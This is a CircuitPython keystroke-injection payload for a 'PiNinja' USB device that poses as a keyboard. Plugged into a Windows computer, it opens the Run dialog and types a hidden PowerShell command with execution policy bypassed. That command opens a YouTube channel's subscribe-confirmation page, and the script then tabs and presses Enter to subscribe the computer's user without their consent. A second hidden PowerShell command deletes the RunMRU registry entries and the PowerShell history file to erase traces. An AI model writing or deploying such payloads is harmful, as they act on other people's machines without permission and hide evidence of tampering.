#PiNinja Payload Script
#Title: Subscribe
#Author: EvMaster114
#Description: Subscribes you to my youtube channel

#Imports
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.mouse import Mouse
from adafruit_hid.keycode import Keycode as key
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from time import sleep
#Varibales
kbd = Keyboard(usb_hid.devices)
lay = KeyboardLayoutUS(kbd)
mse = Mouse(usb_hid.devices)

channel = "https://www.youtube.com/channel/UCORBRBB8A0k7XBAngb3k44w"

def main():
    kbd.send(key.GUI, key.R)
    sleep(0.5)
    lay.write('powershell -w h -NoP -NonI -Exec Bypass Start-Process "' + channel + '?sub_confirmation=1"')
    sleep(0.5)
    kbd.send(key.ENTER)
    sleep(3)
    kbd.send(key.TAB)
    sleep(0.5)
    kbd.send(key.TAB)
    sleep(0.5)
    kbd.send(key.ENTER)
    sleep(1)
    kbd.send(key.LEFT_ALT, key.F4)
    sleep(1)
    kbd.send(key.GUI, key.R)
    sleep(0.5)
    lay.write('powershell -w h -NoP -NonI -Exec Bypass reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath')
    kbd.send(key.ENTER)




